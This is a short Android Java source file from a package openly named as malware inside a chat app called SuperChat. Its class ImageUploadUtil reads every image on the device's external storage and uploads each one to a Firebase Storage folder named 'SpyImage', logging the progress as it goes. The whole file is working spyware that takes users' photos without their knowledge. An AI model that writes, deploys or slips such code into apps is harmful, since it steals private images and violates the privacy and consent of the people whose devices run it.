package com.teamxdevelopers.SuperChat.malware;

import android.content.ContentUris;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore;
import android.util.Log;

import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

public class ImageUploadUtil {

    public static void uploadAllImagesToServer(Context context) {

        Log.d("ImageUpload", "Starting image upload process...");

        FirebaseStorage storage = FirebaseStorage.getInstance();
        StorageReference storageRef = storage.getReference().child("SpyImage");

        try (Cursor cursor = context.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Images.Media._ID}, null, null, null)) {

            if (cursor == null || cursor.getCount() == 0) {
                Log.e("ImageUpload", "Failed to query MediaStore, or no images found.");
                return;
            }


            int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);

            while (cursor.moveToNext()) {
                long id = cursor.getLong(idColumn);
                Uri contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);

                StorageReference imageRef = storageRef.child(contentUri.getLastPathSegment());

                Log.d("ImageUpload", "Preparing to upload image: " + contentUri);

                UploadTask uploadTask = imageRef.putFile(contentUri);
                uploadTask.addOnSuccessListener(taskSnapshot -> {
                    Log.d("ImageUpload", "Image uploaded successfully: " + taskSnapshot.getMetadata().getPath());
                }).addOnFailureListener(e -> {
                    Log.e("ImageUpload", "Error uploading image", e);
                }).addOnProgressListener(snapshot -> {
                    double progress = (100.0 * snapshot.getBytesTransferred()) / snapshot.getTotalByteCount();
                    Log.d("ImageUpload", "Upload is " + progress + "% done");
                });
            }
        } catch (Exception e) {
            Log.e("ImageUpload", "Error accessing media", e);
        }
    }
}
